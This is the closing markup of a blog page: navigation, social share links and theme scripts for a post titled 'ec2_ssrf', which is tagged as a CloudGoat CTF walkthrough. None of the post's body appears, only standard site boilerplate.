<a class=next href=https://jellyparks.com/posts/emr-security-woes/><span class=title>Next Page »</span><br><span>emr_security_woes</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share ec2_ssrf on twitter" href="https://twitter.com/intent/tweet/?text=ec2_ssrf&url=https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f&hashtags=aws%2ccloud%2ccloudgoat%2cwalkthrough%2cctf"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ec2_ssrf on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f&title=ec2_ssrf&summary=ec2_ssrf&source=https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ec2_ssrf on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f&title=ec2_ssrf"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ec2_ssrf on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ec2_ssrf on whatsapp" href="https://api.whatsapp.com/send?text=ec2_ssrf%20-%20https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share ec2_ssrf on telegram" href="https://telegram.me/share/url?text=ec2_ssrf&url=https%3a%2f%2fjellyparks.com%2fposts%2fec2-ssrf%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://jellyparks.com>JellyParks</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>